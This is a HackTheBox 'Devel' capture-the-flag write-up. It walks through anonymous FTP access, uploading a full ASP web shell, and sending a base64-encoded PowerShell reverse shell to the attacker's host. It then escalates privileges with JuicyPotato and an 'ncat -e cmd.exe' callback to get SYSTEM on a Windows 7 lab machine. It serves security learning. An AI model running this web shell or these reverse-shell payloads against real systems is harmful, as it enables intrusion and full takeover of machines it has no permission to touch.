# Devel

## Introduction

Welcome to my another writeup! In this HackTheBox [Devel](https://app.hackthebox.com/machines/Devel) machine, you'll learn: Web shell upload, Windows privilege escalation, and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Initial Foothold](#initial-foothold)**
3. **[Privilege Escalation: `iis apppool\web` to `NT AUTHORITY\SYSTEM`](#privilege-escalation)**
4. **[Conclusion](#conclusion)**

## Background

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Devel/images/Devel.png)

## Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Devel)-[2023.05.16|20:20:21(HKT)]
└> export RHOSTS=10.10.10.5                                   
┌[siunam♥earth]-(~/ctf/htb/Machines/Devel)-[2023.05.16|20:20:28(HKT)]
└> rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt 
[...]
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    syn-ack Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

According to `rustscan` result, we have 2 ports are opened:

|Open Port         | Service                       |
|:---:             |:---:                          |
|21                | Microsoft ftpd                |
|80                | Microsoft IIS httpd 7.5       |

### FTP on Port 21

In the above `nmap` script scanning, the FTP service allows `anonymous` (guest) login.

**Let's login as `anonymous`:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Devel)-[2023.05.16|20:20:28(HKT)]
└> ftp $RHOSTS                   
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:siunam): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> 
```

**Now, enumerate all the files and directories in here!**
```shell
ftp> ls -lah
229 Entering Extended Passive Mode (|||49158|)
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
```

In here, we can see that it has a directory called `aspnet_client`, and files `iisstart.htm`, `welcome.png`.

Which means **this FTP share can access the IIS (Internet Information Services) web server!**

**Can we upload any files?**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Devel)-[2023.05.16|20:25:06(HKT)]
└> touch anything
ftp> put anything
local: anything remote: anything
[...]
ftp> ls
229 Entering Extended Passive Mode (|||49174|)
125 Data connection already open; Transfer starting.
05-16-23  03:25PM                    0 anything
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
```

We can!!

Maybe we can upload a ASP webshell later on.

Speaking of IIS, let's enumerate the HTTP port.

### HTTP on Port 80

**Before we access the web server, let's add a new host to `/etc/hosts`:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Devel)-[2023.05.16|20:27:05(HKT)]
└> echo "$RHOSTS devel.htb" | sudo tee -a /etc/hosts
```

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Devel/images/Pasted%20image%2020230516202802.png)

A default IIS web server page. Nothing weird.

Now, we could start to do content discovery via tools like `gobuster`.

However, since we have access to the FTP server, and it's a share directory for the IIS web server, we can view it's all files and directories:

```shell
ftp> ls aspnet_client
229 Entering Extended Passive Mode (|||49176|)
150 Opening ASCII mode data connection.
03-18-17  02:06AM       <DIR>          system_web
226 Transfer complete.
ftp> ls aspnet_client/system_web
229 Entering Extended Passive Mode (|||49178|)
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          2_0_50727
226 Transfer complete.
ftp> ls aspnet_client/system_web/2_0_50727
229 Entering Extended Passive Mode (|||49180|)
125 Data connection already open; Transfer starting.
226 Transfer complete.
```

Ah... It's all empty.

So, let's upload our web shell!

## Initial Foothold

**But first, I wanna confirm our uploaded files are really exist on port 80's web server:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Devel)-[2023.05.16|20:31:18(HKT)]
└> echo 'FTP upload test' > test.txt                          
ftp> put test.txt 
local: test.txt remote: test.txt
229 Entering Extended Passive Mode (|||49181|)
125 Data connection already open; Transfer starting.
100% |**************************************************************|    17      313.23 KiB/s    --:-- ETA
226 Transfer complete.
17 bytes sent in 00:00 (0.47 KiB/s)
```

```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Devel)-[2023.05.16|20:31:31(HKT)]
└> curl http://devel.htb/test.txt  
FTP upload test
```

Yep! It's really exist on there!

**ASP web shell:** (Modified from [https://github.com/tennc/webshell/blob/master/asp/webshell.asp](https://github.com/tennc/webshell/blob/master/asp/webshell.asp))
```asp
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objshell.exec(thecommand)
    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function

szCMD = request("cmd")
thisDir = getCommandOutput("cmd /c" & szCMD)
Response.Write(thisDir)
%>
```

```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Devel)-[2023.05.16|20:39:19(HKT)]
└> nano webshell.asp 
ftp> put webshell.asp 
local: webshell.asp remote: webshell.asp
229 Entering Extended Passive Mode (|||49195|)
125 Data connection already open; Transfer starting.
100% |**************************************************************|   511       10.59 MiB/s    --:-- ETA
226 Transfer complete.
511 bytes sent in 00:00 (14.08 KiB/s)
```

**Now we have Remote Code Execution (RCE) on the IIS web server:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Devel)-[2023.05.16|20:40:16(HKT)]
└> curl http://devel.htb/webshell.asp --get --data-urlencode "cmd=whoami && ipconfig"
iis apppool\web

Windows IP Configuration


Ethernet adapter Local Area Connection 3:

   Connection-specific DNS Suffix  . : 
   IPv6 Address. . . . . . . . . . . : dead:beef::58c0:f1cf:abc6:bb9e
   Temporary IPv6 Address. . . . . . : dead:beef::e579:7afa:32ae:836a
   Link-local IPv6 Address . . . . . : fe80::58c0:f1cf:abc6:bb9e%15
   IPv4 Address. . . . . . . . . . . : 10.10.10.5
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:6ca8%15
                                       10.10.10.2

Tunnel adapter isatap.{C57F02F8-DF4F-40EE-BC21-A206B3F501E4}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

Tunnel adapter Local Area Connection* 9:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 
```

**Let's get a reverse shell!**

- **Setup a `nc` listener:**

```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Devel)-[2023.05.16|20:57:42(HKT)]
└> sudo rlwrap -cAr nc -lvnp 443
listening on [any] 443 ...
```

- **Send the reverse shell payload:** (Generated from [revshells.com](https://www.revshells.com/))

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Devel/images/Pasted%20image%2020230516205821.png)

```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Devel)-[2023.05.16|20:57:10(HKT)]
└> curl http://devel.htb/webshell.asp --get --data-urlencode "cmd=powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgA2ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
```

```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Devel)-[2023.05.16|20:57:42(HKT)]
└> sudo rlwrap -cAr nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.26] from (UNKNOWN) [10.10.10.5] 49205

PS C:\windows\system32\inetsrv> whoami;ipconfig
iis apppool\web

Windows IP Configuration


Ethernet adapter Local Area Connection 3:

   Connection-specific DNS Suffix  . : 
   IPv6 Address. . . . . . . . . . . : dead:beef::58c0:f1cf:abc6:bb9e
   Temporary IPv6 Address. . . . . . : dead:beef::e579:7afa:32ae:836a
   Link-local IPv6 Address . . . . . : fe80::58c0:f1cf:abc6:bb9e%15
   IPv4 Address. . . . . . . . . . . : 10.10.10.5
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:6ca8%15
                                       10.10.10.2

Tunnel adapter isatap.{C57F02F8-DF4F-40EE-BC21-A206B3F501E4}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

Tunnel adapter Local Area Connection* 9:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 
PS C:\windows\system32\inetsrv> 
```

I'm `iis apppool\web`!

## Privilege Escalation

### `iis apppool\web` to `NT AUTHORITY\SYSTEM`

**Let's enumerate users!**
```shell
PS C:\windows\system32\inetsrv> net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            babis                    Guest                    
```

**In here, we see there's a user called `babis`:**
```shell
PS C:\windows\system32\inetsrv> net user babis
User name                    babis
Full Name                    
Comment                      
User's comment               
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            18/3/2017 2:15:19 ??
Password expires             Never
Password changeable          18/3/2017 2:15:19 ??
Password required            No
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   18/3/2017 2:17:50 ??

Logon hours allowed          All

Local Group Memberships      *Users                
Global Group memberships     *None                 
```

And it just a regular user, nothing weird.

```shell
PS C:\windows\system32\inetsrv> gci c:\users\babis
PS C:\windows\system32\inetsrv> 
```

Couldn't access user `babis`'s home directory.

**How about us?**
```shell
PS C:\windows\system32\inetsrv> whoami /all

USER INFORMATION
----------------

User Name       SID                                                           
=============== ==============================================================
iis apppool\web S-1-5-82-2971860261-2701350812-2118117159-340795515-2183480550


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                    Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
                                     Unknown SID type S-1-5-82-0   Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

In the group information, we see that our **integrity level** is at "High Mandatory Level", which means we're running as administrator. Also, there's group called `NT AUTHORITY\SERVICE`, which means we're a service account.

In privileges information, we can see there's a `SeImpersonatePrivilege`, this is very common in service accounts.

**Check `systeminfo`:**
```shell
PS C:\windows\system32\inetsrv> systeminfo

Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
[...]
System Type:               X86-based PC
[...]
```

As you can see, this Windows machine is Windows 7 Enterprise, version 6.1.7600 N/A Build 7600.

That being said, this Windows version is vulnerable to **[JuicyPotato](https://github.com/ohpe/juicy-potato)**, [RoguePotato](https://github.com/antonioCoco/RoguePotato), and other **Potatoes**.

To escalate our privilege to `NT AUTHORITY\SYSTEM`, we can:

- **Upload `Juicy.Potato.x86.exe` AND `ncat.exe` to the target machine:** (You can download `Juicy.Potato.x86.exe` from [https://github.com/ivanitlearning/Juicy-Potato-x86/releases](https://github.com/ivanitlearning/Juicy-Potato-x86/releases))

```shell
ftp> binary 
200 Type set to I.
ftp> put /opt/juicy-potato/Juicy.Potato.x86.exe JuicyPotatox86.exe
local: /opt/juicy-potato/Juicy.Potato.x86.exe remote: JuicyPotatox86.exe
229 Entering Extended Passive Mode (|||49222|)
125 Data connection already open; Transfer starting.
100% |**************************************************************|   257 KiB    1.64 MiB/s    00:00 ETA
226 Transfer complete.
263680 bytes sent in 00:00 (486.86 KiB/s)
ftp> put /opt/static-binaries/binaries/windows/x86/ncat.exe ncat.exe
local: /opt/static-binaries/binaries/windows/x86/ncat.exe remote: ncat.exe
229 Entering Extended Passive Mode (|||49218|)
125 Data connection already open; Transfer starting.
100% |**************************************************************|  2278 KiB    2.01 MiB/s    00:00 ETA
226 Transfer complete.
2332672 bytes sent in 00:01 (1.94 MiB/s)
```

- **Setup a `nc` listener:**

```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Devel)-[2023.05.16|21:31:14(HKT)]
└> rlwrap -cAr nc -lvnp 4444
listening on [any] 4444 ...
```

- **Run the JuicyPotato's payload:**

```shell
PS C:\windows\system32\inetsrv> c:\inetpub\wwwroot\JuicyPotatox86.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\inetpub\wwwroot\ncat.exe -e cmd.exe 10.10.14.26 4444" -t *
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

- **Profit:**

```shell
C:\Windows\system32>whoami && ipconfig
whoami && ipconfig
nt authority\system

Windows IP Configuration


Ethernet adapter Local Area Connection 3:

   Connection-specific DNS Suffix  . : 
   IPv6 Address. . . . . . . . . . . : dead:beef::58c0:f1cf:abc6:bb9e
   Temporary IPv6 Address. . . . . . : dead:beef::e579:7afa:32ae:836a
   Link-local IPv6 Address . . . . . : fe80::58c0:f1cf:abc6:bb9e%15
   IPv4 Address. . . . . . . . . . . : 10.10.10.5
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:6ca8%15
                                       10.10.10.2

Tunnel adapter isatap.{C57F02F8-DF4F-40EE-BC21-A206B3F501E4}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

Tunnel adapter Local Area Connection* 9:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 
```

I'm `nt authority\system`!

## Rooted

**user.txt:**
```shell
C:\Windows\system32>type c:\users\babis\desktop\user.txt
type c:\users\babis\desktop\user.txt
{Redacted}
```

**root.txt:**
```shell
C:\Windows\system32>type c:\users\administrator\desktop\root.txt
type c:\users\administrator\desktop\root.txt
{Redacted}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Devel/images/Pasted%20image%2020230516213911.png)

# Conclusion

What we've learned:

1. Upload Web Shell Via Anonymous Login In FTP
2. Vertical Privilege Escalation Via JuicyPotato